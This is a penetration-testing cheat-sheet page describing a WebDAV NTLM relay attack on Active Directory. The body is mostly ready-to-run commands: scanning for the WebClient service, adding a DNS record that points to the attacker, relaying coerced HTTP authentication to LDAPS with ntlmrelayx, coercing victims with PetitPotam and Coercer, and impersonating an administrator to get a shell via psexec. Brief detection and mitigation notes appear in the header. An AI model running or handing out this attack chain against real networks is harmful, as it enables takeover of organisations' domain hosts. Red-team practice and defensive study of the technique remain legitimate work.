---
title: WebDAV relay (SMB → HTTP)
category: AD / Relay & Coercion
order: 14
tags: [webdav, webclient, http, relay, ldap, rbcd, adidns]
summary: >
  The WebClient service makes a machine authenticate over HTTP (WebDAV). HTTP
  auth is unsigned, so it relays to LDAP(S) and AD CS even when SMB signing is
  enforced everywhere — the standard way to turn coercion into RBCD.
prerequisites:
  - The coerced machine must have the WebClient service running (common on workstations, rare on servers)
  - A name the victim resolves to $attacker_ip (ADIDNS record, or LLMNR/NBNS) — WebDAV needs a hostname, not an IP
tools: [netexec (webdav module), WebClientServiceScanner, PetitPotam, Coercer, ntlmrelayx, dnstool.py]
detection:
  - Outbound WebDAV (HTTP PROPFIND) from a computer to an unknown host
  - .searchConnector-ms / .library-ms files appearing on shares
mitigation:
  - Disable the WebClient service via GPO; enforce LDAP channel binding (EPA)
  - Block WebDAV egress; monitor ADIDNS record creation
refs:
  - { label: "SpecterOps — Certified Pre-Owned / WebClient", url: "https://posts.specterops.io/" }
  - { label: "dirkjanm — Relaying to LDAP", url: "https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" }
  - { label: "Coercer", url: "https://github.com/p0dalirius/Coercer" }
---

Why bother when you already have SMB coercion? Because **SMB-sourced auth can't
reach LDAP** (signing/MIC). WebDAV gives you an **HTTP** auth from the same
victim, which relays to LDAP → RBCD/Shadow Credentials, even in a
"SMB-signing-everywhere" environment.

## 1. Find machines with WebClient running

```sh
netexec smb $ip/24 -u $user -p $password -M webdav
# or the standalone scanner
webclientservicescanner $domain/$user:$password@$ip/24
```

## 2. Give the victim a name to resolve to you

WebDAV needs a **hostname**. Add an ADIDNS record (any authenticated user can):

```sh
dnstool.py -u "$domain\\$user" -p $password -a add -r attacker -d $attacker_ip $dc_ip
# now \\attacker@80\ resolves to you
```

## 3. Start the relay to LDAP

```sh
# HTTP auth -> LDAPS -> configure RBCD from a computer you control
ntlmrelayx.py -t ldaps://$dc_ip --delegate-access -smb2support
```

## 4. Coerce over WebDAV (note the @80)

```sh
# the @80 forces the WebDAV/HTTP path instead of SMB
petitpotam.py -d $domain -u $user -p $password 'attacker@80/loot' $target
# Coercer, trying WebDAV-capable methods
coercer coerce -u $user -p $password -d $domain -t $target -l 'attacker@80/loot' --filter webdav
```

## 5. Cash in

ntlmrelayx writes RBCD on the coerced computer for the account it created; then
S4U to take the host over:

```sh
getST.py -spn cifs/$target -impersonate administrator -dc-ip $dc_ip 'EVIL$':'Evil123!'
export KRB5CCNAME=administrator.ccache && psexec.py -k -no-pass $target
```

> No WebClient running on your target? Drop a `.searchConnector-ms` on a share
> the victim browses to start it, or coerce a workstation (they run it far more
> often than servers).
